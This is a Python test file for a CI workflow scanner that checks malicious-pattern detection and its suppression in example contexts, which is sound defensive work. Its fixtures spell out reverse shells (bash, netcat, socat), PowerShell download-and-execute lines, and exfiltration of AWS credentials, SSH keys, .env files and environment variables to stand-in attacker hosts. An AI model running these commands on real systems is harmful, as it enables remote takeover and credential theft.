"""Per-pattern coverage for ``_malicious.py``.

Existing rule-level tests (``test_workflow_fixtures``,
``test_pipeline_poisoning``) exercise the wiring: do GHA-027 / GL-025
/ etc. surface a finding when the workflow contains a recognized
indicator. They don't, however, lock in *which* specific indicators trigger.
This file does. Add a new ``MaliciousPattern`` and you should add a
positive case here so a future tightening can't silently regress
recall.

The negative cases are deliberate: they assert that the example /
fixture / docs context-aware suppression keeps a benign mention from
firing. Those assertions also pin the suppression contract so a
``looks_like_example`` change can't quietly start letting real hits
through.
"""
from __future__ import annotations

import pytest

from pipeline_check.core.checks._malicious import find_malicious_patterns

# ──────────────────────────────────────────────────────────────────
# Existing patterns: smoke regression so a refactor can't drop them.
# ──────────────────────────────────────────────────────────────────


@pytest.mark.parametrize("blob,expected_category", [
    # base64-decoded pipe to shell
    (
        "echo aGVsbG8gd29ybGQgaGVsbG8gd29ybGQgaGVsbG8= | base64 -d | sh",
        "obfuscated-exec",
    ),
    # bash /dev/tcp reverse shell
    (
        "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
        "reverse-shell",
    ),
    # netcat -e reverse shell
    (
        "nc 10.0.0.1 4444 -e /bin/bash",
        "reverse-shell",
    ),
    # xmrig miner binary
    (
        "./xmrig --url stratum+tcp://pool.minexmr.com:4444",
        "crypto-miner",
    ),
    # Discord webhook exfil
    (
        "curl -X POST https://discord.com/api/webhooks/1234567890/abcXYZ "
        "-d @secrets.json",
        "exfil-channel",
    ),
    # env to network exfil
    (
        "env | curl -X POST -d @- http://attacker.example/x",
        "credential-exfil",
    ),
    # history erasure
    ("history -c && exit 0", "audit-erasure"),
])
def test_existing_patterns_still_fire(blob: str, expected_category: str) -> None:
    cats = {c for c, _n, _e in find_malicious_patterns(blob)}
    assert expected_category in cats, (
        f"expected {expected_category!r} category match in: {blob!r}; "
        f"got {sorted(cats) or 'no matches'}"
    )


# ──────────────────────────────────────────────────────────────────
# New patterns: PowerShell IEX downloader, socat reverse shell,
# base64-encoded credential exfil.
# ──────────────────────────────────────────────────────────────────


class TestPowerShellIEXDownloader:
    def test_long_form_DownloadString(self) -> None:
        blob = (
            'IEX (New-Object Net.WebClient).DownloadString'
            '("http://attacker.example/payload.ps1")'
        )
        cats = {c for c, _n, _e in find_malicious_patterns(blob)}
        assert "obfuscated-exec" in cats

    def test_invoke_expression_alias(self) -> None:
        blob = (
            'Invoke-Expression (New-Object System.Net.WebClient).'
            'DownloadString("http://x/y")'
        )
        cats = {c for c, _n, _e in find_malicious_patterns(blob)}
        assert "obfuscated-exec" in cats

    def test_invoke_webrequest_pipe_to_iex(self) -> None:
        blob = "Invoke-WebRequest http://x/y.ps1 | IEX"
        cats = {c for c, _n, _e in find_malicious_patterns(blob)}
        assert "obfuscated-exec" in cats

    def test_iwr_pipe_to_iex(self) -> None:
        blob = "iwr http://attacker.example/p.ps1 | iex"
        cats = {c for c, _n, _e in find_malicious_patterns(blob)}
        assert "obfuscated-exec" in cats

    def test_does_not_fire_on_legitimate_iwr(self) -> None:
        # A WebRequest that doesn't pipe into IEX is not malicious.
        blob = "$resp = Invoke-WebRequest -Uri http://api.example/health"
        hits = find_malicious_patterns(blob)
        assert all("PowerShell" not in n for _c, n, _e in hits)


class TestSocatReverseShell:
    def test_tcp_listen_exec(self) -> None:
        blob = "socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash"
        cats = {c for c, _n, _e in find_malicious_patterns(blob)}
        assert "reverse-shell" in cats

    def test_tcp_connect_back_system(self) -> None:
        blob = "socat TCP:10.0.0.1:4444 SYSTEM:'bash -i'"
        cats = {c for c, _n, _e in find_malicious_patterns(blob)}
        assert "reverse-shell" in cats

    def test_openssl_tls_variant(self) -> None:
        blob = "socat OPENSSL:c2.example:443,verify=0 EXEC:/bin/sh"
        cats = {c for c, _n, _e in find_malicious_patterns(blob)}
        assert "reverse-shell" in cats

    def test_does_not_fire_on_benign_socat(self) -> None:
        # socat used as a TCP relay, no shell exec. Should not fire.
        blob = "socat TCP-LISTEN:8080,fork TCP:upstream.local:80"
        hits = find_malicious_patterns(blob)
        assert all("socat" not in n.lower() for _c, n, _e in hits)


class TestBase64EncodedCredentialExfil:
    def test_aws_credentials_via_base64_curl(self) -> None:
        blob = (
            "base64 ~/.aws/credentials | curl -X POST "
            "-d @- http://attacker.example/x"
        )
        cats = {c for c, _n, _e in find_malicious_patterns(blob)}
        assert "credential-exfil" in cats

    def test_dotenv_via_xxd_nc(self) -> None:
        blob = "xxd -p .env | nc 10.0.0.1 4444"
        cats = {c for c, _n, _e in find_malicious_patterns(blob)}
        assert "credential-exfil" in cats

    def test_id_rsa_via_base64_wget(self) -> None:
        blob = "base64 ~/.ssh/id_rsa | wget --post-data=@- http://x/u"
        cats = {c for c, _n, _e in find_malicious_patterns(blob)}
        assert "credential-exfil" in cats

    def test_does_not_fire_on_unrelated_base64(self) -> None:
        # base64 of a build asset is benign.
        blob = "base64 dist/bundle.js | curl -F file=@- https://upload.example/"
        hits = find_malicious_patterns(blob)
        assert all(
            "credential" not in c for c, _n, _e in hits
        ), f"unexpected credential-exfil match in: {blob!r}"


# ──────────────────────────────────────────────────────────────────
# Suppression: example/fixture/docs context must not hide a real hit
# in production code, but must hide a literal mention inside an
# obvious example block.
# ──────────────────────────────────────────────────────────────────


def test_example_yaml_key_suppresses() -> None:
    # The reverse shell sits under an ``examples:`` key, well away from
    # production execution. Suppression should kick in.
    blob = (
        "jobs:\n"
        "  examples:\n"
        "    description: |\n"
        "      bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n"
    )
    cats = {c for c, _n, _e in find_malicious_patterns(blob)}
    assert "reverse-shell" not in cats, (
        "expected suppression under an 'examples:' YAML ancestor"
    )


def test_inline_example_comment_suppresses() -> None:
    blob = (
        "# example: red-team simulation payload\n"
        "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n"
    )
    cats = {c for c, _n, _e in find_malicious_patterns(blob)}
    assert "reverse-shell" not in cats


def test_production_match_still_fires_despite_inline_comment() -> None:
    # Inline ``// example`` annotation on a *separate* block must NOT
    # suppress a real hit elsewhere in the document. Suppression scope
    # is the local window, not the whole blob.
    blob = (
        "jobs:\n"
        "  prod-deploy:\n"
        "    steps:\n"
        "      - run: bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n"
        "\n"
        "# Old experiment, this was an example payload from training\n"
    )
    cats = {c for c, _n, _e in find_malicious_patterns(blob)}
    assert "reverse-shell" in cats, (
        "real reverse-shell in prod-deploy must still fire even when "
        "an unrelated 'example' comment appears later in the document"
    )
